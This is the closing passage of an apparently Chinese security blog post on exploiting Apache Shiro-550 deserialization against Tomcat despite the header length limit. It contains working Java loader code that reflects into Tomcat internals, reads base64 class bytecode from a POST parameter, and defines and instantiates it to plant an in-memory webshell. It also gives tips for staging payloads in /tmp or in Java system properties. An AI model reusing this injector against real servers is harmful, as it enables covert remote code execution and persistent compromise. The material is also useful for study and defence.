+</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;handler&#34;</span>);
+</span></span><span style="display:flex;"><span>            }<span style="color:#66d9ef">catch</span> (NoSuchFieldException e){
+</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getSuperclass</span>().<span style="color:#a6e22e">getSuperclass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;handler&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>            obj <span style="color:#f92672">=</span> f.<span style="color:#a6e22e">get</span>(obj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getSuperclass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;global&#34;</span>);
+</span></span><span style="display:flex;"><span>            }<span style="color:#66d9ef">catch</span>(NoSuchFieldException e){
+</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;global&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>            obj <span style="color:#f92672">=</span> f.<span style="color:#a6e22e">get</span>(obj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            f <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;processors&#34;</span>);
+</span></span><span style="display:flex;"><span>            f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>            java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">List</span> processors <span style="color:#f92672">=</span> (java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">List</span>)(f.<span style="color:#a6e22e">get</span>(obj));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> 0; j <span style="color:#f92672">&lt;</span> processors.<span style="color:#a6e22e">size</span>(); <span style="color:#f92672">++</span>j) {
+</span></span><span style="display:flex;"><span>                Object processor <span style="color:#f92672">=</span> processors.<span style="color:#a6e22e">get</span>(j);
+</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> processor.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;req&#34;</span>);
+</span></span><span style="display:flex;"><span>                f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>                Object req <span style="color:#f92672">=</span> f.<span style="color:#a6e22e">get</span>(processor);
+</span></span><span style="display:flex;"><span>                Object note <span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;getNote&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>}).<span style="color:#a6e22e">invoke</span>(req, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{Integer.<span style="color:#a6e22e">valueOf</span>(1)});
+</span></span><span style="display:flex;"><span>                String base64encoded <span style="color:#f92672">=</span> (String) note.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;getParameter&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}).<span style="color:#a6e22e">invoke</span>(note, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;data&#34;</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (base64encoded <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> org.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">shiro</span>.<span style="color:#a6e22e">codec</span>.<span style="color:#a6e22e">Base64</span>.<span style="color:#a6e22e">decode</span>(base64encoded);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                ClassLoader classLoader <span style="color:#f92672">=</span> Thread.<span style="color:#a6e22e">currentThread</span>().<span style="color:#a6e22e">getContextClassLoader</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (classLoader <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                    classLoader <span style="color:#f92672">=</span> ClassLoader.<span style="color:#a6e22e">getSystemClassLoader</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                    java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">Method</span> defineClassMethod <span style="color:#f92672">=</span> ClassLoader.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;defineClass&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, <span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>, <span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>});
+</span></span><span style="display:flex;"><span>                    defineClassMethod.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>                    Class expClass <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>                        expClass <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;Payload&#34;</span>);  <span style="color:#75715e">// 方便多次加载</span>
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">catch</span> (Exception e){
+</span></span><span style="display:flex;"><span>                        expClass <span style="color:#f92672">=</span> (Class) defineClassMethod.<span style="color:#a6e22e">invoke</span>(classLoader, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{code, Integer.<span style="color:#a6e22e">valueOf</span>(0), Integer.<span style="color:#a6e22e">valueOf</span>(code.<span style="color:#a6e22e">length</span>)});
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    expClass.<span style="color:#a6e22e">newInstance</span>();
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span> (Exception e){
+</span></span><span style="display:flex;"><span>                    e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e){
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>最终header中的payload长度为4736，可以绕过长度限制。</p>
+<p>POST data参数传Payload类的base64编码后的字节码。</p>
+<p>javassist生成代码有一些神奇的报错，比如数字需要用<code>Integer.valueOf</code>包一下，还有就是POST传参的base64 payload需要url编码。</p>
+<p>将内存马注入器写到无参构造函数里，编译然后Base64编码，POST传参即可</p>
+<h2 id="分段传输">分段传输<a hidden class="anchor" aria-hidden="true" href="#分段传输">#</a></h2>
+<p>可以将payload分成多段，先分段把payload保存在服务器上，然后再加载。</p>
+<p><strong>输出到文件</strong></p>
+<p>将字节码分段写入<code>/tmp</code>目录下，写完之后再最后读取加载，这种会有文件落地，不多说了。</p>
+<p><strong>写入系统配置</strong></p>
+<p>代码<code>System.setProperty(&quot;payload&quot;,&quot;&quot;);</code>可以写入java系统配置。</p>
+<p>分段写入后，读取加载即可：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;payload&#34;</span>);
+</span></span></code></pre></div><h1 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
+<p><a href="https://su18.org/post/shiro-5/">https://su18.org/post/shiro-5/</a></p>
+<p><a href="https://juejin.cn/post/6991664333314850853">https://juejin.cn/post/6991664333314850853</a></p>
+<p><a href="https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/">https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/</a></p>
+<p><a href="https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEcho-%E5%85%A8%E7%89%88%E6%9C%AC.jsp">https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEcho-%E5%85%A8%E7%89%88%E6%9C%AC.jsp</a></p>
+<p><a href="http://www.bmth666.cn/2024/11/03/Shiro%E7%BB%95%E8%BF%87Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/">http://www.bmth666.cn/2024/11/03/Shiro%E7%BB%95%E8%BF%87Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
